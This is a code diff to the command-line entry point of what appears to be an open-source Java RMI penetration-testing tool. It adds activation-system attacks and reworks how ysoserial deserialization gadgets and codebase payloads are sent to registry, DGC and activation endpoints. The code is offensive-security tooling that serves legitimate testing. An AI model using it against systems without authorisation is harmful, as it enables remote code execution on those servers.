@@ -15,14 +15,16 @@ import de.qtc.rmg.internal.ExceptionHandler;
 import de.qtc.rmg.internal.MethodCandidate;
 import de.qtc.rmg.io.Formatter;
 import de.qtc.rmg.io.Logger;
+import de.qtc.rmg.io.SampleWriter;
 import de.qtc.rmg.io.WordlistHandler;
+import de.qtc.rmg.networking.RMIWhisperer;
+import de.qtc.rmg.operations.ActivationClient;
 import de.qtc.rmg.operations.DGCClient;
 import de.qtc.rmg.operations.MethodAttacker;
 import de.qtc.rmg.operations.MethodGuesser;
 import de.qtc.rmg.operations.RegistryClient;
 import de.qtc.rmg.utils.RMGUtils;
-import de.qtc.rmg.utils.RMIWhisperer;
-import de.qtc.rmg.utils.SampleWriter;
+import de.qtc.rmg.utils.YsoIntegration;
 import javassist.CannotCompileException;
 import javassist.NotFoundException;
 
@@ -48,10 +50,7 @@ public class Starter {
 
         Properties config = new Properties();
         RMGUtils.loadConfig(defaultConfiguration, config, false);
-
-        String additionalConfig = commandLine.getOptionValue("config", null);
-        if( additionalConfig != null )
-            RMGUtils.loadConfig(additionalConfig, config, true);
+        RMGUtils.loadConfig(commandLine.getOptionValue("config", null), config, true);
 
         int legacyMode = parser.getLegacyMode();
         int argumentPos = Integer.valueOf(commandLine.getOptionValue("argument-position", "-1"));
@@ -64,6 +63,7 @@ public class Starter {
         String functionSignature = commandLine.getOptionValue("signature", "");
         String boundName = commandLine.getOptionValue("bound-name", null);
         String regMethod = parser.validateRegMethod(commandLine.getOptionValue("reg-method", "lookup"));
+        String dgcMethod = parser.validateDgcMethod(commandLine.getOptionValue("dgc-method", "clean"));
 
         Logger.verbose = !commandLine.hasOption("json");
         boolean sslValue = commandLine.hasOption("ssl");
@@ -77,18 +77,18 @@ public class Starter {
             Logger.disableColor();
         }
 
-        Formatter format = new Formatter(commandLine.hasOption("json"));
+        Formatter format = new Formatter();
         RMIWhisperer rmi = new RMIWhisperer(host, port, sslValue, followRedirect);
 
         RMGUtils.init();
         RMGUtils.disableWarning();
-        RMGUtils.showStackTrace(commandLine.hasOption("stack-trace"));
+        ExceptionHandler.showStackTrace(commandLine.hasOption("stack-trace"));
 
         String[] boundNames = null;
         HashMap<String,String> allClasses = null;
         ArrayList<HashMap<String,String>> boundClasses = null;
 
-        if( !action.matches("bind|dgc|rebind|reg|unbind|listen") && !functionSignature.matches("reg|dgc")) {
+        if( !action.matches("act|bind|dgc|rebind|reg|unbind|listen") && !functionSignature.matches("reg|dgc|act")) {
 
             if(action.matches("enum"))
                 RMGUtils.enableCodebase();
@@ -103,7 +103,7 @@ public class Starter {
         }
 
         MethodCandidate candidate = null;
-        if( functionSignature != "" && !functionSignature.matches("reg|dgc") ) {
+        if( functionSignature != "" && !functionSignature.matches("reg|dgc|act") ) {
 
             try {
                 candidate = new MethodCandidate(functionSignature);
@@ -158,13 +158,13 @@ public class Starter {
                         candidates = wlHandler.getWordlistMethods();
                     } catch( IOException e ) {
                         Logger.eprintlnMixedYellow("Caught", "IOException", "while reading wordlist file(s).");
-                        RMGUtils.stackTrace(e);
+                        ExceptionHandler.stackTrace(e);
                         RMGUtils.exit();
                     }
                 }
 
                 MethodGuesser guesser = new MethodGuesser(rmi, boundClasses.get(1), candidates);
-                HashMap<String,ArrayList<MethodCandidate>> results = guesser.guessMethods(boundName, threadCount, createSamples, zeroArg, legacyMode);
+                HashMap<String,ArrayList<MethodCandidate>> results = guesser.guessMethods(boundName, threadCount, zeroArg, legacyMode);
 
                 format.listGuessedMethods(results);
                 if( !createSamples )
@@ -210,6 +210,7 @@ public class Starter {
             case "dgc":
             case "reg":
             case "listen":
+            case "act":
 
                 String gadget = parser.getPositionalString(3);
                 String command = parser.getPositionalString(4);
@@ -222,20 +223,23 @@ public class Starter {
                 }
 
                 if( action.equals("listen") ) {
-                    RMGUtils.createListener(ysoserialPath, String.valueOf(port), gadget, command);
+                    YsoIntegration.createJRMPListener(ysoserialPath, host, port, gadget, command);
                 }
 
-                Object payload = RMGUtils.getPayloadObject(ysoserialPath, gadget, command);
+                Object payload = YsoIntegration.getPayloadObject(ysoserialPath, gadget, command);
 
                 if( action.equals("method") ) {
                     MethodAttacker attacker = new MethodAttacker(rmi, allClasses, candidate);
                     attacker.attack(payload, boundName, argumentPos, "ysoserial", legacyMode);
-                } else if( action.equals("dgc" )) {
+                } else if( action.equals("dgc") ) {
                     DGCClient dgc = new DGCClient(rmi);
-                    dgc.attackCleanCall(payload);
-                } else {
+                    dgc.gadgetCall(dgcMethod, payload);
+                } else if( action.equals("reg") ) {
                     reg = new RegistryClient(rmi);
                     reg.gadgetCall(payload, regMethod, localhostBypass);
+                } else if( action.equals("act") ) {
+                    ActivationClient act = new ActivationClient(rmi);
+                    act.gadgetCall(payload);
                 }
 
                 break;
@@ -251,7 +255,7 @@ public class Starter {
                     payload = RMGUtils.makeSerializableClass(className);
                     payload = ((Class)payload).newInstance();
 
-                } catch (CannotCompileException | NotFoundException | InstantiationException | IllegalAccessException e) {
+                } catch (CannotCompileException | InstantiationException | IllegalAccessException e) {
                     ExceptionHandler.unexpectedException(e, "payload", "creation", true);
                 }
 
@@ -260,10 +264,13 @@ public class Starter {
                     attacker.attack(payload, boundName, argumentPos, "codebase", legacyMode);
                 } else if( functionSignature.matches("dgc") ) {
                     DGCClient dgc = new DGCClient(rmi);
-                    dgc.codebaseCleanCall(payload);
+                    dgc.codebaseCall(dgcMethod, payload);
                 } else if( functionSignature.matches("reg") ) {
                     reg = new RegistryClient(rmi);
                     reg.codebaseCall(payload, regMethod, localhostBypass);
+                } else if( functionSignature.matches("act") ) {
+                    ActivationClient act = new ActivationClient(rmi);
+                    act.codebaseCall(payload);
                 }
 
                 break;
@@ -286,13 +293,17 @@ public class Starter {
 
                 Logger.println("");
                 DGCClient dgc = new DGCClient(rmi);
-                dgc.enumDGC();
+                dgc.enumDGC(dgcMethod);
 
                 Logger.println("");
-                dgc.enumJEP290();
+                dgc.enumJEP290(dgcMethod);
 
                 Logger.println("");
                 registryClient.enumJEP290Bypass(regMethod, localhostBypass, marshal);
+
+                Logger.println("");
+                ActivationClient activationClient = new ActivationClient(rmi);
+                activationClient.enumActivator();
                 break;
 
             default:
